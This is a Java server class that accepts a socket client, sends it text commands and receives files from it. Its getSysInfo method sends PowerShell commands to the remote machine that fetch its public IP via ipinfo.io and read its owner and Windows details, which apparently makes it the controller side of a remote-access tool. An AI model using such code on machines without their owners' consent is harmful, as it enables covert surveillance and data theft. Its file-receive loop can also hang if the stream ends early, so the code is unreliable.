package connection;

import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import org.apache.commons.io.IOUtils;

public class Server {
	private Socket s;
	private ServerSocket ss;
	private DataOutputStream dout;
	private DataInputStream din;
	
	private int _port;
	
	public Server(int port){
		_port = port;
	}

	public void connect() throws IOException{
		ss = new ServerSocket(_port);
		s = ss.accept();
		System.gc(); //Calls the garbage collector because of the previous function
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
	}
	
	public String send(String str) throws IOException {
		dout.writeUTF(str);
		dout.flush();
		
		return din.readUTF();
	}
	
	public String receive() throws IOException {
		return din.readUTF();
	}
	
	public void receive(String fileName) throws IOException {
	    Thread t = new Thread() {
	    	public void run() {
	    		Socket temporarySocket = null;
	    		try {
				    temporarySocket = ss.accept();
				    
				    InputStream is = temporarySocket.getInputStream();
				    DataInputStream din = new DataInputStream(is);
				    FileOutputStream out = new FileOutputStream(new File(fileName));
				    BufferedOutputStream bos = new BufferedOutputStream(out);
				    
				    //Client sends length of file
				    int length = Integer.valueOf(din.readUTF());
				    byte [] mybytearray  = new byte [length];
				    System.out.println("Receiving " + fileName + " (" + length + " bytes)");
				    
				    //is.read tries to read up to length, but may read less
				    int bytesRead = is.read(mybytearray, 0, length);
				    int current = bytesRead;
				    
				    while (current != length) {
				    	System.out.println(current + "/" + length);
				    	bytesRead = is.read(mybytearray, current, (length - current));
				    	if(bytesRead >= 0) {
				    		current += bytesRead;
				    	}
				    }
				    
				    System.out.println("File recieved");
			
				    bos.write(mybytearray, 0 , length);
				    bos.flush();
				    
				    is.close();
					out.close();
					bos.close();
	    		}catch(IOException e) {
	    			System.out.println(e.getMessage());
	    			try{temporarySocket.close();}catch(IOException e2) {}
	    		}
	    	}
	    };
		t.start();
		try{t.join();}catch(InterruptedException e) {};
	}

	public void end() throws IOException {
		dout.close();
		din.close();
		s.close();
		ss.close();
	}
	
	public boolean connectionIsOpen() {
		return !s.isClosed();
	}
	
	public String getSysInfo() throws IOException {
		String sysInfo = "[not found]";
		
		if(s.isConnected()) {
			dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
			dout.flush();
			sysInfo = "\n" + "Public ip: " + din.readUTF();
			
			dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
			dout.flush();
			sysInfo += din.readUTF();
		}
		
		return sysInfo;
	}
}
